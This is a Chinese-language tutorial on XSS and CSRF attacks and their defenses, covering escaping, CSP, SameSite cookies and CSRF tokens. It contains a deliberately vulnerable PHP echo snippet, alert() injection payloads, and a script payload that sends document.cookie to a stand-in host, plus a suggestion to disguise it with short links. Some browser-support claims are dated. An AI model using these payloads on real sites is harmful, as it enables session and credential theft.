# XSS 简介
XSS（Cross-site scripting）跨站脚本攻击，为了不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。

# XSS 原理
用户的输入内容被当作程序在网页执行。

![XSS攻击](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMTA2MTQzNzA5NTM5?x-oss-process=image/format,png)

# XSS 危害

- 偷取用户的密码和登录态
- 破坏页面结构
- 重定向到其它网站

# XSS 攻击分类

XSS 攻击主要有两种类型，一种是反射型，另一种是存储型。

## 反射型（Reflected）

> url 参数直接注入

我们会发现网站的某个内容是从 url 参数中获取的，这个时候就可能发生反射性 XSS 攻击。

```php
<?php 
$content = $_GET['content'];
echo $content;
```

比如 `test.com` 网站后端代码如上所示，当我们访问 `http://test.com/index.php?content=Hello%20world%3Cscript%3Ealert(%27try%20it%27)%3C/script%3E` 时，就会出现如下界面
![反射型攻击](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMTA2MTU0MDMzNjc0?x-oss-process=image/format,png)

也许有人会说，不就是弹个框吗，有什么大不了的。那如果 `content` 参数的内容改成`<script>location.href='http://b.com?session='+document.cookie</script>`，而这个 b 网站恰好是我写的，那么通过该链接访问网站的人他的 cookie 信息就泄露了，极有可能 cookie 里面含有账号密码信息。

当然如果直接把这个链接给别人，那么有点常识的人看到这个特别的 url 都不会点。但是，我们可以利用短链，将这些参数隐藏，这样别人中招的概率就会大大提高。

## 存储型（Stored）

> 存储到 DB 后读取时注入

这种类型的攻击一般发生在表单提交的地方，文章评论区居多。

不同于反射型，存储型攻击的危害要更大，他的传播面积广，存在时间长。

比如，当我们在评论输入了 `<script>location.href='http://b.com?session='+document.cookie</script>` 这样的内容，然后将他提交，内容便会保存到数据库。如果其他人，进入看网站，看到了这条评论，那么他就会中招。

# XSS 攻击注入点

## HTML 节点内容

![节点内容](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMTA2MTYyOTAzMzI4?x-oss-process=image/format,png)

## HTML 属性

```html
<img src="{{picUrl}}">
<img src="x" onerror="alert('xss')">
```

当 picUrl 的内容为 `x" onerror="alert('xss')` 时。

## JavaScript 代码

```html
<script>
    var content = "{{name}}";
    var content = "xss";alert('xss');"";
</script>
```

当 name 的内容为 `xss";alert('xss');"`

## 富文本

一般富文本需要直接渲染一些 HTML 标签，所以这一块很容易出现 XSS 攻击。

# XSS 攻击防御

对于 XSS 类型的攻击，防御的重点就是不信任用户的输入，对特殊的字符进行转移，包括 `< `、 `>`、 `'`、 `"` 等。

## HTML 节点内容

- 数据输入时进行转义
- 数据输出时进行转义

> 例如：将文本内容的特殊字符 `('<'` 和 `'>')` 进行转移输出。

## HTML 属性

属性可以使用单引号和双引号以及不用引号，所以需要转义单引号、双引号以及空格。但是 HTML 中多个空格只会显示一个，一般情况是不转义空格的。

## JavaScript 代码

和 HTML 属性类似，主要是转移变量中的单引号和双引号。

## 富文本

富文本主要内容是一大段 HTML。

解决思路：

- 按白名单保留部分标签和属性
- 按黑名单屏蔽部分标签和属性

## CSP（Content Security Policy）内容安全策略

最后来看一种更优雅的解决方案，浏览器的 XSS Auditor，使得反射型 XSS 几乎被废；CSP(Content-Security-Policy)、X-XSS-Protection 可以禁止不可信源的脚本执行！

具体内容可以参考：[https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP](https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP)

# CSRF 简介

CSRF（Cross-site request forgery）跨站请求伪造。与 XSS 一样，这里也出现了 cross-site，但是两者有很大的区别。

* XSS：主要指本网站运行了外部的脚本程序
* CSRF：主要指在外部网站运行程序，对本网站造成了影响

CSRF 更通俗具体一点讲，指外部网站在用户不知情的情况下，对目标（被攻击）网站发出了请求。

# CSRF 原理

![CSRF原理](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMTA3MjIwNjI2NDA0?x-oss-process=image/format,png)

针对“访问网站会带上该网站的 cookie，而 cookie 中又可能包含用户的身份”这一特性，外部网站可以在用户不知情的情况下，向目标网站发出请求

# CSRF 危害

- 冒名发帖
- 冒名消费
- 冒名转账

# CSRF 防御

## 禁止来自第三方网站的请求带上 cookie

为了从源头上解决 CSRF 问题，Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为本网站 cookie，不能作为外部网站 cookie。

SameSite 有两个属性值，分别是 Strict 和 Lax：

- SameSite=Strict：严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie
- SameSite=Lax：宽松模式，比 Strict 放宽了点限制：假如这个请求是改变了当前页面或者打开了新页面，且同时是个 GET 请求，则这个 cookie 可以作为第三方 cookie。

**目前为止只有 chrome 浏览器支持 SameSite 属性**

## 使用验证码

![验证码](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMTA3MjEyOTE0Njgw?x-oss-process=image/format,png)

如图所以示，我们可以在用户提交表单的地方加入验证码，阻止不经过用户感知，静默提交的行为。

## 使用 CSRF Token

同时将 token 写入表单和 cookie 当中，由于外部网站无法读取目标网站的 cookie，那么自然无法伪造正确的请求。

具体来讲，是使用了签名的机制。

1. 表单中的 token 与 cookie 中的 token 都是后端生成的
2. 表单中的 token 是原密码，而 cookie 中的 token 是原密码加密后得到的

举例来说：表单中的 token 为 `5678`，cookie 中的 token 为 `e2c83847505a87ed35aebb7465de62cf`

加密规则：加密密码 = md5(原密码 + sermfjheuf&^w-w~~)

当请求发送到后台时，我们只需要校验一下 CSRF Token 是否匹配就行。

## 判断 Referer 请求头

当 Referer 请求头是外部网站时，我们就可以拒绝该请求。

**由于 Referer 是浏览器自动为我们添加的，所以它也是可以伪造的，并不能完全信任**
